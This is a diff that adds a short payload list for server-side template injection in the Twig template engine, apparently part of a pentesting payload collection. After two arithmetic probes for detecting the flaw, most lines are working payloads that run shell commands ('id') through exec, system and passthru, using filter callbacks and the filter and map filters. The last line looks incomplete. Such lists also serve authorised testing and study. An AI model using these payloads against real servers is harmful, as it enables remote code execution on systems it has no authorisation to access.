@@ -1,0 +1,8 @@
+# SSTI - Twig Payloads
+{{7*7}}
+{{7*'7'}}
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
+{{['id']|filter('system')}}
+{{['id']|map('system')}}
+{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('id')}}
+{%- set cmd = 'id' -%}{%- for i in cmd|split('') -%}{%- endfor -%}
